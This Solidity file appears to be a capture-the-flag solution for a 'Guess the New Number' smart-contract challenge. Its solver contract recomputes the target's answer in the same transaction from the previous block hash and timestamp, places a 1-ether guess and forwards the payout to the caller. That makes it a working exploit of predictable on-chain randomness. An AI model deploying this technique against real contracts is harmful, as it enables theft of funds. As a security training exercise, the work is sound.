pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberSolver {
    GuessTheNewNumberChallenge public challenge;

    function GuessTheNewNumberSolver(address _challenge) public payable {
        challenge = GuessTheNewNumberChallenge(_challenge);
    }

    function() public payable {}

    function smartGuess() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(msg.value)(answer);
        msg.sender.transfer(address(this).balance); // return the refund to our calling account
    }
}
